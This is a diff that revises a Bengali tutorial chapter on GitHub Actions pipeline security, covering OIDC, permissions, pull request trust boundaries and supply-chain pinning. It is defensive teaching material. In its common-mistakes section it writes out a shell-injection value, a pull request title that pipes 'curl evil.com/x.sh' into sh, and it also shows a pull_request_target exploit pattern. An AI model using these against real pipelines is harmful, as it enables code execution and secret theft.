@@ -1,30 +1,30 @@
 ---
 sourceHash: "f57f5c3106c0128463c9b7ab1a2afe513a516bfa23bc71d881e68156e7e107d9"
 title: "GitHub Actions ও Pipeline Security"
-translatedAt: "2026-10-13T03:04:03.608Z"
+translatedAt: "2026-10-19T07:59:22.678Z"
 model: "claude-opus-5-5 (Claude Code)"
 ---
 
 # GitHub Actions ও Pipeline Security {#ch-github-actions}
 
-> এমন একটি workflow লিখুন যা test, build আর deploy করে, কোনো দীর্ঘস্থায়ী credential রাখে না, আর কোনো pull request যাকে hijack করতে পারে না।
+> এমন workflow লিখুন, যা test, build আর deploy করে, কোনো দীর্ঘমেয়াদি credential রাখে না, আর কোনো pull request যাকে hijack করতে পারে না।
 
-**এই অধ্যায়ে:** workflow, job আর step · store করা key-এর বদলে OIDC · least-privilege `permissions` · pull request-এর trust boundary · pinning, lockfile আর provenance
+**এই অধ্যায়ে:** workflow, job আর step · জমা রাখা key-এর বদলে OIDC · ন্যূনতম অধিকারের `permissions` · pull request-এর trust boundary · pinning, lockfile আর provenance
 
 ## 💡 মূল ধারণা
 
-একটি workflow হলো কয়েকটি job-এর সমষ্টি, আর **প্রতিটি job একটি পরিষ্কার machine পায়** (একটি runner)। আপনি
-dependency declare না করলে job-গুলো parallel-এ চলে। এদের মাঝে disk-এর কিছুই টিকে থাকে না, তাই file সরে artefact বা
-cache হিসেবে। আগে job graph-টা design করুন, তাহলে YAML প্রায় নিজে থেকেই লেখা হয়ে যায়।
+Workflow হলো কয়েকটি job-এর সমষ্টি, আর **প্রতিটি job পায় একটি পরিষ্কার machine** (runner)। Dependency declare না করলে
+job-গুলো parallel-এ চলে। এক job থেকে আরেক job-এ disk-এর কিছুই টিকে থাকে না, তাই file সরাতে হয় artefact বা cache দিয়ে।
+আগে job-এর graph-টা design করুন, তাহলে YAML প্রায় নিজে থেকেই লেখা হয়ে যায়।
 
-দ্বিতীয় সত্যটা ক্ষমতা নিয়ে। Pipeline যেকোনো একজন developer-এর চেয়ে বেশি privilege রাখে। এর কাছে source আছে, cloud
-credential আছে, আর registry-তে push করার access আছে। একটি compromised laptop একজন engineer-কে প্রভাবিত করে। একটি
-compromised pipeline attacker-এর code তাদের হয়ে sign করে দেয়। তাই pipeline যা রাখে তা কমান, যা ব্যবহার করে তা pin
-করুন, আর যা করেছে তা record করুন।
+দ্বিতীয় কথাটা ক্ষমতা নিয়ে। Pipeline-এর হাতে যেকোনো একজন developer-এর চেয়ে বেশি privilege থাকে। এর কাছে আছে source,
+cloud credential, আর registry-তে push করার access। একটি laptop হাতছাড়া হলে ক্ষতি একজন engineer-এর। কিন্তু pipeline
+হাতছাড়া হলে সেটা attacker-এর code-এ নিজেই sign করে দেয়। তাই pipeline-এর হাতে যা থাকে তা কমান, যা কিছু pipeline ব্যবহার করে
+তা pin করুন, আর যা করেছে তার রেকর্ড রাখুন।
 
-> ⚠️ **যা বদলাতে থাকে:** action-এর major version মোটামুটি প্রতি বছর বদলায়। 2026 পর্যন্ত `actions/checkout` v6-এ আর
-> `actions/setup-node` v7-এ আছে। Provenance format আর SLSA level-ও এখনো স্থির হচ্ছে।
-> টেকসই নীতি: একটি tag বদলানো যায়, একটি commit SHA বা digest বদলানো যায় না। SHA দিয়ে pin করুন।
+> ⚠️ **যা বদলাতে থাকে:** action-এর major version মোটামুটি প্রতি বছর বদলায়। 2026 অনুযায়ী `actions/checkout` আছে v6-এ,
+> আর `actions/setup-node` v7-এ। Provenance-এর format আর SLSA level-ও এখনো থিতু হচ্ছে।
+> টেকসই নীতি: tag বদলানো যায়, commit SHA বা digest বদলানো যায় না। SHA দিয়ে pin করুন।
 
 ## কীভাবে কাজ করে
 
@@ -36,7 +36,7 @@ flowchart TD
   J1 -->|needs:| J2
 ```
 
-**একটি workflow ছড়িয়ে পড়ে কয়েকটি job-এ; `needs:`-ই parallel job-গুলোকে আবার একটি ক্রমে ফেরায়।**
+**একটি workflow কয়েকটি job-এ ছড়িয়ে পড়ে; parallel job-গুলোকে আবার ক্রমে ফিরিয়ে আনে `needs:`।**
 
 **একটি সম্পূর্ণ CI workflow:**
 
@@ -87,40 +87,39 @@ jobs:
           cache-to: type=gha,mode=max
 ```
 
-`concurrency` পুরোনো হয়ে যাওয়া commit-এর জন্য খরচ করা বন্ধ করে। `fail-fast: false` matrix-এর একটি fail করা অংশকে
-বাকিগুলো লুকিয়ে ফেলতে দেয় না। `cache: npm` install-কে কয়েক মিনিট থেকে কয়েক সেকেন্ডে নামিয়ে আনে।
+`concurrency` পুরনো হয়ে যাওয়া commit-এর জন্য খরচ বাঁচায়। `fail-fast: false` দেয় বলে matrix-এর একটি অংশ fail করলে
+বাকিগুলো চাপা পড়ে না। `cache: npm` install-এর সময় কয়েক মিনিট থেকে কয়েক সেকেন্ডে নামিয়ে আনে।
 
-Integration test-এর জন্য একটি আসল database `services:` container হিসেবে চালু করুন। Mock করবেন না। এটাকে একটি
-`--health-cmd` দিন। সেটা না থাকলে job container-এর সঙ্গে race করে, আর প্রতি দশবারে মোটামুটি একবার fail করে।
+Integration test-এর জন্য `services:` container হিসেবে সত্যিকারের database চালু করুন। Mock করবেন না। এতে একটি
+`--health-cmd` দিন। না দিলে job আর container-এর মধ্যে দৌড় লাগে, আর মোটামুটি প্রতি দশটি run-এ একটি fail করে।
 
-একটি pipeline-এ ঢোকার attack-এর পথ অল্প কয়েকটি, আর সেগুলো সবার জানা। এ কারণেই এদের উত্তর দেওয়া যায়:
+Pipeline-এ ঢোকার পথ অল্প কয়েকটি, আর সবার জানা। এজন্যই এগুলোর উত্তর দেওয়া যায়:
 
-| ঢোকার পথ | এটা কী পায় | নিয়ন্ত্রণ |
-| ------- | ------------ | ----------- |
-| Store করা একটি দীর্ঘস্থায়ী cloud key | Rotate না হওয়া পর্যন্ত সেই role যা করতে পারে, সবকিছু | OIDC federation |
-| বদলানো যায় এমন tag-এ একটি third-party action | আপনার job-এ যেকোনো code | একটি commit SHA-তে pin করুন |
-| বদলানো যায় এমন tag-এ একটি dependency বা base image | আপনার artefact-এ যেকোনো code | Lockfile, digest pinning |
-| Secret scope-এ রেখে একটি fork-এর pull request | আপনার secret, একজন অজানা contributor-এর হাতে | `pull_request`, `pull_request_target` নয় |
-| একটি `run:` block-এ untrusted event text | Runner-এ shell execution | `env:` দিয়ে পাঠান |
+| ঢোকার পথ | কী হাতে পায় | নিয়ন্ত্রণ |
+| ------- | ---------- | -------- |
+| জমা রাখা দীর্ঘমেয়াদি cloud key | ওই role যা যা পারে সব, rotate না করা পর্যন্ত | OIDC federation |
+| বদলানো যায় এমন tag-এ third-party action | আপনার job-এ যেকোনো code | Commit SHA দিয়ে pin |
+| বদলানো যায় এমন tag-এ dependency বা base image | আপনার artefact-এ যেকোনো code | Lockfile, digest দিয়ে pin |
+| Secret নাগালে রেখে fork-এর pull request | আপনার secret, এক অচেনা contributor-এর হাতে | `pull_request`, `pull_request_target` নয় |
+| `run:` block-এ untrusted event text | Runner-এ shell execution | `env:` দিয়ে পাঠান |
 
 ## কখন ব্যবহার করবেন
 
-| পরিস্থিতি | পছন্দ | কারণ |
-| -------- | ------ | ------ |
-| একটি build bundle deploy job-এ সরানো | Artefact | না পেলে job fail করতে হবে, ধীর হলে চলবে না |
-| Dependency আবার download করা এড়ানো | Lockfile-এর `hashFiles()` দিয়ে key করা cache | না পেলে শুধু সময় নষ্ট হয় |
-| পঞ্চাশটি repo জুড়ে একই build-and-deploy | Reusable workflow | পুরো job, নিজস্ব runner, `secrets: inherit` |
-| বারবার আসা একগুচ্ছ step, যেমন Node setup | Composite action | Caller-এর job-এর ভেতরে চলে |
-| একজন contributor-এর fork-এ test চালানো | `pull_request` | Design অনুযায়ীই secret ছাড়া চলে |
-| একটি fork-এর pull request-এ label বা comment দেওয়া | `pull_request_target` | শুধু metadata, কখনো head checkout করবেন না |
-| একটি cloud account-এ deploy করা | OIDC, সঙ্গে একটি `environment` | কোনো store করা key নেই, আর একটি মানুষের gate আছে |
+| পরিস্থিতি | বাছাই | কারণ |
+| -------- | ---- | --- |
+| Build bundle deploy job-এ সরানো | Artefact | না পেলে job fail করা উচিত, ধীর হওয়া নয় |
+| বারবার dependency download এড়ানো | Lockfile-এর `hashFiles()`-কে key করে cache | না পেলে শুধু সময় নষ্ট |
+| পঞ্চাশটি repo-তে একই build আর deploy | Reusable workflow | পুরো job, নিজের runner, `secrets: inherit` |
+| বারবার আসা step-এর দল, যেমন Node setup | Composite action | Caller-এর job-এর ভেতরেই চলে |
+| Contributor-এর fork-এ test চালানো | `pull_request` | নকশা অনুযায়ীই secret ছাড়া চলে |
+| Fork-এর pull request-এ label বা comment | `pull_request_target` | শুধু metadata, head কখনো checkout নয় |
+| Cloud account-এ deploy | OIDC, সঙ্গে একটি `environment` | কোনো key জমা নেই, আর একজন মানুষের gate |
 
-## OIDC দিয়ে Deploy — কোনো Static Key নয়
+## OIDC দিয়ে deploy, কোনো static key ছাড়া
 
-❌ Repository secret হিসেবে store করা দীর্ঘস্থায়ী IAM key কখনো rotate হয় না। যে এগুলো পড়তে পারে, সে-ই ব্যবহার করতে
-পারে।
+❌ Repository secret হিসেবে জমা রাখা দীর্ঘমেয়াদি IAM key কখনো rotate হয় না। যে পড়তে পারে, সে-ই ব্যবহার করতে পারে।
 
-✅ **OIDC federation — এমন credential, যা এক ঘণ্টায় মেয়াদ হারায়:**
+✅ **OIDC federation: এমন credential, যার মেয়াদ এক ঘণ্টায় শেষ:**
 
 ```yaml
 deploy:
@@ -141,12 +140,12 @@ deploy:
         docker push $ECR/api:${{ github.sha }}
 ```
 
-Job-টি GitHub-এর কাছে একটি signed JWT (একটি sign করা token) চায়। এর claim-গুলোতে repository, ref আর environment-এর
-নাম থাকে। Cloud এগুলো একটি trust policy-র সঙ্গে মিলিয়ে দেখে, আর অস্থায়ী credential ফেরত দেয়। কিছুই store করা হয়
-না, তাই কিছুই rotate করতে হয় না। Run-এর নামে session-এর নাম দিলে প্রতিটি cloud call-কে একটি workflow পর্যন্ত খুঁজে
-বের করা যায়।
+Job-টা GitHub-এর কাছে একটি signed JWT (sign করা token) চায়। এর claim-এ লেখা থাকে repository, ref আর environment।
+Cloud একটি trust policy-র সঙ্গে সেগুলো মিলিয়ে দেখে, আর অস্থায়ী credential ফেরত দেয়। কিছুই জমা থাকে না, তাই rotate
+করার মতোও কিছু নেই। Session-এর নাম run-এর নামে দিলে cloud-এর প্রতিটি call একটি নির্দিষ্ট workflow পর্যন্ত খুঁজে বের
+করা যায়।
 
-**Security আসলে থাকে trust policy-তে।** YAML শুধু চায়:
+**আসল security থাকে trust policy-তে।** YAML শুধু চায়:
 
 ```json
 {
@@ -159,26 +158,26 @@ Job-টি GitHub-এর কাছে একটি signed JWT (একটি sign
 }
 ```
 
-> ⚠️ **OIDC-র সবচেয়ে সাধারণ ভুল হলো একটি ঢিলেঢালা `sub` শর্ত।** `repo:acme/*` organisation-এর যেকোনো repository-কে
-> production role নিতে দেয়। এর মধ্যে একজন attacker-এর তৈরি করা নতুন repository-ও পড়ে। Repository pin করুন, আর
-> environment বা branch-ও pin করুন।
+> ⚠️ **OIDC-তে সবচেয়ে সাধারণ ভুল হলো ঢিলেঢালা `sub` শর্ত।** `repo:acme/*` দিলে organisation-এর যেকোনো repository
+> production role নিতে পারে। এর মধ্যে attacker-এর বানানো নতুন repository-ও আছে। Repository pin করুন, সঙ্গে environment
+> বা branch-ও pin করুন।
 
-Job-এর `environment` এমন কিছু নিয়ম যোগ করে, যা YAML-এ নয়, repository setting-এ থাকে। সেগুলো হলো required
-reviewer, একটি wait timer, আর একটি branch restriction, যাতে শুধু `main` deploy করতে পারে। অন্য secret-এর জন্য,
-যেমন third-party API key, একই OIDC identity দিয়ে runtime-এ একটি secrets manager থেকে সেগুলো আনুন।
+Job-এর `environment` এমন কিছু নিয়ম যোগ করে, যা থাকে repository settings-এ, YAML-এ নয়। সেগুলো হলো বাধ্যতামূলক reviewer,
+একটি wait timer, আর branch-এর সীমা, যাতে শুধু `main` deploy করতে পারে। অন্য secret, যেমন third-party API key, runtime-এ
+একই OIDC identity দিয়ে secrets manager থেকে নিয়ে আসুন।
 
-## Least-Privilege Permission
+## ন্যূনতম অধিকারের Permission
 
-Default `GITHUB_TOKEN` বেশিরভাগ job-এর যা দরকার, তার চেয়ে বেশি করতে পারে। ওপরের CI workflow-টি workflow-এর
-default হিসেবে `contents: read` set করে। শুধু deploy job এটা বাড়ায়, `id-token: write` যোগ করে, যাতে শুধু সে-ই cloud
-role নিতে পারে। Build আর deploy আলাদা job রাখুন, যাতে build compromise হলেও deploy করার ক্ষমতা না পাওয়া যায়।
+Default `GITHUB_TOKEN` বেশিরভাগ job-এর যতটা দরকার, তার চেয়ে বেশি পারে। ওপরের CI workflow পুরো workflow-এর default হিসেবে
+`contents: read` দেয়। শুধু deploy job এটা বাড়ায়, `id-token: write` যোগ করে, যাতে কেবল এই job-ই cloud role নিতে পারে।
+Build আর deploy আলাদা job-এ রাখুন, যাতে build হাতছাড়া হলেও deploy করার ক্ষমতা না যায়।
 
 ## Pull Request-এর Trust Boundary
 
-`pull_request` fork-এর code secret **ছাড়া** চালায়। `pull_request_target` চলে base repository-র context-এ, secret
-**সহ**, আর একটি writable token নিয়ে।
+`pull_request` fork-এর code চালায় secret **ছাড়া**। `pull_request_target` চলে base repository-র context-এ, secret
+**সহ**, আর সঙ্গে লেখার অধিকারওয়ালা token।
 
-❌ **একটি সুপরিচিত exploit pattern:**
+❌ **সবার জানা একটি exploit pattern:**
 
 ```yaml
 on: pull_request_target # runs with repository secrets
@@ -191,45 +190,44 @@ jobs:
       - run: npm ci && npm run build # arbitrary code, full secret access
 ```
 
-শুধু একটি install script-ই যথেষ্ট। Attacker-এর build সফল হওয়ার কোনো দরকারই নেই। এই একই boundary-র কারণে একটি
-self-hosted runner কখনো public repository-কে serve করা উচিত নয়: যেকোনো fork আপনার machine-এ code চালায়।
+একটি install script-ই যথেষ্ট। Build সফল হওয়ার দরকারই attacker-এর নেই। একই boundary-র কারণে self-hosted runner কখনো
+public repository-কে serve করবে না: যেকোনো fork আপনার machine-এ code চালিয়ে ফেলবে।
 
 ## Supply Chain: Pinning, Lockfile আর Provenance
 
 | ঝুঁকি | প্রতিকার |
-| ---- | ---------- |
-| একটি ক্ষতিকর package version | Commit করা lockfile-এর বিপরীতে `npm ci` |
-| অন্য দিকে ঘুরিয়ে দেওয়া একটি action tag | Third-party action-কে একটি **পুরো commit SHA**-তে pin করুন |
-| বদলানো যায় এমন একটি base image | Digest দিয়ে pin করুন — `@sha256:…` |
-| একটি typosquatted package | Registry-র allowlist রাখুন, একটি internal registry দিয়ে proxy করুন |
+| ---- | ------- |
+| ক্ষতিকর package version | Commit করা lockfile-এর ওপর `npm ci` |
+| অন্য দিকে ঘুরিয়ে দেওয়া action tag | Third-party action-কে **পুরো commit SHA** দিয়ে pin করুন |
+| বদলানো যায় এমন base image | Digest দিয়ে pin করুন: `@sha256:…` |
+| Typosquat করা package | Registry-র allowlist, ভেতরের একটি registry-র মধ্য দিয়ে proxy |
 
-2025 জুড়ে npm আর CI marketplace-এর attack-গুলো কাজ করেছে, কারণ বেশিরভাগ ব্যবহারকারী বদলানো যায় এমন tag ব্যবহার
-করতেন। First-party `actions/*` একটি major tag-এ রাখা স্বীকৃত আপস। বাকি সবকিছু SHA দিয়ে pin করুন।
+2025 জুড়ে npm আর CI marketplace-এর attack-গুলো সফল হয়েছিল, কারণ বেশিরভাগ ব্যবহারকারী বদলানো যায় এমন tag ব্যবহার করতেন।
+First-party `actions/*`-কে major tag-এ রাখা গ্রহণযোগ্য আপস। বাকি সব SHA দিয়ে pin করুন।
 
-Dependency (Dependabot), code (CodeQL) আর build করা image (Trivy) scan করুন। শুধু high আর critical-এ fail করান, নইলে
-team gate এড়িয়ে যেতে শিখে যায়। একটি **SBOM** (software bill of materials) artefact-এর ভেতরের সবকিছুর তালিকা দেয়,
-তাই *"এই CVE কি আমাদের প্রভাবিত করে?"* একটি query হয়ে যায়। Artefact-কে `cosign` বা build provenance
-attestation দিয়ে sign করুন। তারপর deploy-এর সময় signature যাচাই করুন। যে signature কেউ check করে না, সেটা শুধুই
-metadata।
+Dependency (Dependabot), code (CodeQL) আর build করা image (Trivy) scan করুন। Fail করান শুধু high আর critical-এ, নইলে team
+gate পাশ কাটাতে শিখে যায়। **SBOM** (software bill of materials) artefact-এর ভেতরের সবকিছুর তালিকা দেয়, ফলে
+*"এই CVE কি আমাদের আক্রান্ত করে?"* প্রশ্নটা একটি query হয়ে যায়। Artefact sign করুন `cosign` দিয়ে, কিংবা build provenance
+attestation দিয়ে। তারপর deploy-এর সময় signature যাচাই করুন। যে signature কেউ check করে না, সেটা নিছক metadata।
 
-এই একই build আর deploy job দিয়েই release configuration ship হয়, যেমন একটি frontend যে security header set করে। তাই
-সেই header-গুলোও code-এর মতোই review আর pinning পায়।
+একই build আর deploy job দিয়েই release configuration ship হয়, যেমন frontend যে security header বসায়। তাই সেই header-গুলোও
+code-এর মতোই review আর pinning পায়।
 
-## একটি Leak হওয়া Token কী করে
+## ফাঁস হওয়া token কী করে
 
-একটি leak হওয়া cloud key attacker-কে সেই role যা করতে পারে সবকিছু দেয়, যতক্ষণ না কেউ সেটা rotate করে। Write
-scope-সহ একটি leak হওয়া `GITHUB_TOKEN` code push করতে বা একটি release বদলাতে পারে। Secret-কে repository-তে পৌঁছাতে
-দেবেন না, কয়েক স্তরে: একটি pre-commit hook, remote-এ push protection, আর পুরো history-র ওপর একটি CI scan। Scan-এর
-`fetch-depth: 0` দরকার, নইলে এটা শুধু সর্বশেষ commit দেখে।
+ফাঁস হওয়া cloud key attacker-কে তার role যা যা পারে সবই দেয়, যতক্ষণ না কেউ সেটা rotate করেন। লেখার scope-ওয়ালা ফাঁস
+হওয়া `GITHUB_TOKEN` দিয়ে code push করা যায়, কিংবা release বদলানো যায়। Secret যাতে repository-তে না পৌঁছায়, সেজন্য কয়েক
+স্তরে আটকান: একটি pre-commit hook, remote-এ push protection, আর পুরো history-র ওপর একটি CI scan। Scan-এর জন্য লাগে
+`fetch-depth: 0`, নইলে scan শুধু শেষ commit-টাই দেখে।
 
-> ⚠️ **একটি leak হওয়া secret push হওয়ার মুহূর্তেই compromised**, আপনি force-push করে সরিয়ে দিলেও।
-> Fork, clone আর CI cache এর copy রেখে দেয়। আগে rotate করুন, তারপর history পরিষ্কার করুন। ক্রমটা গুরুত্বপূর্ণ।
+> ⚠️ **Push হওয়ার মুহূর্তেই ফাঁস হওয়া secret বেহাত ধরে নিতে হবে**, force-push করে সরিয়ে দিলেও।
+> Fork, clone আর CI cache-এ copy থেকে যায়। আগে rotate করুন, তারপর history পরিষ্কার করুন। ক্রমটাই আসল।
 
 ## সাধারণ ভুল
 
-❌ **একটি `run` block-এ event data interpolate করা।** ধরুন একটি pull request-এর title `"; curl evil.com/x.sh | sh`।
-এটা runner-এ execute হয়, কারণ shell line-টি দেখার আগেই `${{ }}` substitute করে ফেলে।
-✅ এটাকে `env:` দিয়ে পাঠান, যাতে shell এটাকে data হিসেবে ধরে:
+❌ **Event-এর data সরাসরি `run` block-এ বসানো।** ধরুন pull request-এর title হলো `"; curl evil.com/x.sh | sh`।
+এটা runner-এ চলে যায়, কারণ shell line-টা দেখার আগেই `${{ }}` value বসিয়ে দেয়।
+✅ `env:` দিয়ে পাঠান, যাতে shell এটাকে data হিসেবে দেখে:
 
 ```yaml
 - env:
@@ -237,62 +235,57 @@ scope-সহ একটি leak হওয়া `GITHUB_TOKEN` code push কর�
   run: echo "Title: $TITLE"
 ```
 
-❌ **Third-party action-কে একটি tag-এ pin করা।** Action-এর মালিক যে-ই হোক, `@v2`-কে নতুন code-এর দিকে ঘুরিয়ে দিতে
-পারে। ✅ একটি পুরো commit SHA-তে pin করুন, যেমন `some-org/deploy-action@a1b2c3d4…`।
+❌ **Third-party action-কে tag দিয়ে pin করা।** Action-এর মালিক যে-ই হোন, তিনি `@v2`-কে নতুন code-এর দিকে ঘুরিয়ে দিতে পারেন।
+✅ পুরো commit SHA দিয়ে pin করুন, যেমন `some-org/deploy-action@a1b2c3d4…`।
 
-❌ **যে commit-এ token leak হয়েছিল সেটা delete করে ঠিক হয়ে গেছে ভাবা।** Copy আগেই তৈরি হয়ে গেছে।
-✅ আগে rotate করুন। History rewrite করাকে গোছগাছ হিসেবে দেখুন, প্রতিকার হিসেবে নয়।
+❌ **যে commit token ফাঁস করেছে সেটা মুছে ভাবা, সমস্যা মিটে গেছে।** Copy আগেই ছড়িয়ে গেছে।
+✅ আগে rotate করুন। History rewrite-কে গোছগাছ ভাবুন, প্রতিকার নয়।
 
-❌ **এমন একটি cache key, যা কখনো বদলায় না।** একবার লেখা হলে একটি entry আর বদলানো যায় না, তাই এটা কখনো update
-হয় না। ✅ `hashFiles('**/package-lock.json')` দিয়ে key করুন, আর prefix fallback হিসেবে `restore-keys` রাখুন।
+❌ **এমন cache key, যা কখনো বদলায় না।** একবার লেখা হলে entry আর বদলানো যায় না, তাই কখনো update হয় না।
+✅ Key দিন `hashFiles('**/package-lock.json')` দিয়ে, আর prefix ধরে fallback হিসেবে `restore-keys` রাখুন।
 
 ## 🔑 মূল শিক্ষা
 
-- প্রতিটি job একটি পরিষ্কার runner পায়, তাই file সরাতে artefact ব্যবহার করুন, আর আবার download এড়াতে cache।
-- `permissions:` স্পষ্টভাবে declare করুন, `contents: read` থেকে শুরু করে, আর শুধু যে job-এর দরকার সেখানেই বাড়ান।
-- Store করা cloud key-এর বদলে OIDC ব্যবহার করুন, আর trust policy-র `sub`-কে একটি repository আর environment-এ pin
-  করুন।
-- Third-party action-কে commit SHA-তে আর base image-কে digest-এ pin করুন, কারণ বদলানো যায় এমন tag-ই supply chain-এর
-  ফুটো।
-- `pull_request_target`-এর সঙ্গে head commit checkout করলে আপনার secret একজন অজানা contributor-এর হাতে চলে যায়।
+- প্রতিটি job পায় একটি পরিষ্কার runner। তাই file সরাতে artefact, আর বারবার download এড়াতে cache ব্যবহার করুন।
+- `permissions:` স্পষ্ট করে declare করুন, শুরু করুন `contents: read` থেকে, আর বাড়ান শুধু সেই job-এ, যার দরকার।
+- জমা রাখা cloud key-এর বদলে OIDC নিন, আর trust policy-র `sub`-কে একটি repository আর environment-এ pin করুন।
+- Third-party action-কে commit SHA দিয়ে আর base image-কে digest দিয়ে pin করুন, কারণ বদলানো যায় এমন tag-ই supply chain-এর ফুটো।
+- `pull_request_target`-এর সঙ্গে head commit checkout করলে আপনার secret এক অচেনা contributor-এর হাতে চলে যায়।
 
 ## Interview-এর প্রশ্ন
 
-**Q: Credential store না করে একটি workflow-কে একটি cloud provider-এ কীভাবে authenticate করবেন?**
+**Q: Credential জমা না রেখে workflow-কে cloud provider-এ authenticate করাবেন কীভাবে?**
 
-OIDC federation ব্যবহার করুন। Cloud account-এ GitHub-এর issuer register করুন, আর এমন একটি role তৈরি করুন যার
-trust policy `sub` claim-কে একটি repository আর একটি environment-এ pin করে। Workflow-টি `id-token: write` দেয়। এটা
-JWT-টি বদলে এমন credential নেয়, যা মোটামুটি এক ঘণ্টায় মেয়াদ হারায়। কে কোথায় deploy করতে পারবে, তা ঠিক করে trust
-policy, YAML নয়।
+OIDC federation দিয়ে। Cloud account-এ GitHub-এর issuer register করুন, আর এমন একটি role বানান, যার trust policy `sub`
+claim-কে একটি repository আর একটি environment-এ pin করে। Workflow দেয় `id-token: write`। এটা JWT-টা বদলে এমন credential
+নেয়, যার মেয়াদ মোটামুটি এক ঘণ্টা। কে কোথায় deploy করতে পারবে, তা ঠিক করে trust policy, YAML নয়।
 
 **Q: `pull_request_target`-এর ঝুঁকি কী, আর কখন এটা ব্যবহার করবেন?**
 
-এটা চলে base repository-র context-এ, secret আর একটি writable token নিয়ে। কিন্তু code আসতে পারে একটি untrusted
-fork থেকে। এটা যদি head commit checkout করে আর কোনো install বা build step চালায়, তাহলে contributor-এর code আপনার
-secret নিয়ে চলে। Contributor-এর code-এর জন্য `pull_request` ব্যবহার করুন, আর `pull_request_target` রাখুন labelling-এর
-মতো metadata job-এর জন্য।
+এটা চলে base repository-র context-এ, secret আর লেখার অধিকারওয়ালা token নিয়ে। কিন্তু code আসতে পারে অবিশ্বস্ত কোনো fork
+থেকে। Head commit checkout করে কোনো install বা build step চালালেই contributor-এর code আপনার secret নিয়ে চলে। Contributor-এর
+code-এর জন্য `pull_request` ব্যবহার করুন, আর `pull_request_target` রাখুন label দেওয়ার মতো metadata job-এর জন্য।
 
-**Q: একটি reusable workflow আর একটি composite action-এর পার্থক্য কী?**
+**Q: Reusable workflow আর composite action-এর পার্থক্য কী?**
 
-একটি reusable workflow call করা হয় job-স্তরে, পুরো job define করে, নিজের runner-এ চলে, আর `secrets: inherit` নিতে
-পারে। একটি composite action call করা হয় step-স্তরে, আর caller-এর job-এর ভেতরে চলে। বারবার আসা step-এর গুচ্ছের
-জন্য composite action ব্যবহার করুন, আর অনেক repository জুড়ে একটি পুরো pipeline একই রকম করতে reusable workflow।
+Reusable workflow call হয় job-এর স্তরে, পুরো job define করে, নিজের runner-এ চলে, আর `secrets: inherit` নিতে পারে।
+Composite action call হয় step-এর স্তরে, আর caller-এর job-এর ভেতরেই চলে। বারবার আসা step-এর দলের জন্য composite
+action, আর অনেক repository জুড়ে পুরো pipeline একরকম করতে reusable workflow।
 
-**Q: কখন একটি self-hosted runner ব্যবহার করবেন, আর এর মূল্য কী?**
+**Q: কখন self-hosted runner ব্যবহার করবেন, আর এর দাম কী?**
 
-যখন job-এর এমন কিছু দরকার, যা একটি hosted runner দিতে পারে না: private network access, বিশেষ hardware, বা খুব বড়
-একটি cache। মূল্য হলো আপনার pipeline-এর trust boundary-র ভেতরে একটি machine। এটাকে ephemeral হতে হবে, কখনো
-public repository serve করবে না, আর production-মানের patching পাবে। বেশিরভাগ team-এর জন্য একটি hosted runner আর
-একটি service container-ই ভালো উত্তর।
+যখন job-এর এমন কিছু লাগে, যা hosted runner দিতে পারে না: private network access, বিশেষ hardware, কিংবা খুব বড় cache। দাম
+হলো আপনার pipeline-এর trust boundary-র ভেতরে একটি machine। সেটা অস্থায়ী হতে হবে, কখনো public repository serve করবে না,
+আর production-এর মানের patching পাবে। বেশিরভাগ team-এর জন্য hosted runner আর একটি service container-ই ভালো উত্তর।
 
-**Q: আপনার pipeline থেকে একটি token leak হয়েছে। আপনি কী করবেন, আর আগে থেকে কী থাকা দরকার?**
+**Q: আপনার pipeline থেকে একটি token ফাঁস হয়েছে। কী করবেন, আর আগে থেকে কী ব্যবস্থা থাকা দরকার?**
 
-আগে rotate করুন, কারণ push হওয়ার মুহূর্তেই এটা compromised হয়ে গেছে। History rewrite করা শুধু গোছগাছ। তারপর
-identity-টি কী করেছে তা দেখতে cloud-এর audit log ব্যবহার করুন। এটা তখনই কাজ করে, যখন role session-গুলো run ID বহন
-করে। Commit SHA দিয়ে tag করা image আর immutable registry tag প্রমাণ করে আসলে কী চলেছিল।
+আগে rotate করুন, কারণ push হওয়ার মুহূর্তেই সেটা বেহাত। History rewrite শুধু গোছগাছ। তারপর cloud audit log দেখে বের করুন
+ওই identity কী কী করেছে। এটা কাজ করে শুধু তখনই, যখন role session-এ run ID থাকে। আসলে কী চলেছিল, তা প্রমাণ করে commit
+SHA দিয়ে tag দেওয়া image আর registry-র immutable tag।
 
 ## এরপর কী পড়বেন
 
-- [Chapter ?? — Deployment Strategy, Rollback ও Feature Flag](#ch-deployment-strategies) — image নিয়ে deploy job-এর কী করা উচিত
+- [Chapter ?? — Deployment Strategy, Rollback ও Feature Flag](#ch-deployment-strategies) — deploy job image-টা নিয়ে কী করবে
 - [Chapter ?? — Container Image: Build ও Hardening](#ch-docker-fundamentals) — digest pinning, build secret, আর কেন build cache আর ship করা layer একই জিনিস
-- [Chapter ?? — Git-এর মূল কথা ও Recovery](#ch-git-fundamentals) — rotate করার পর history থেকে একটি secret সরানো
+- [Chapter ?? — Git-এর মূল কথা ও Recovery](#ch-git-fundamentals) — rotate করার পরে history থেকে secret সরানো
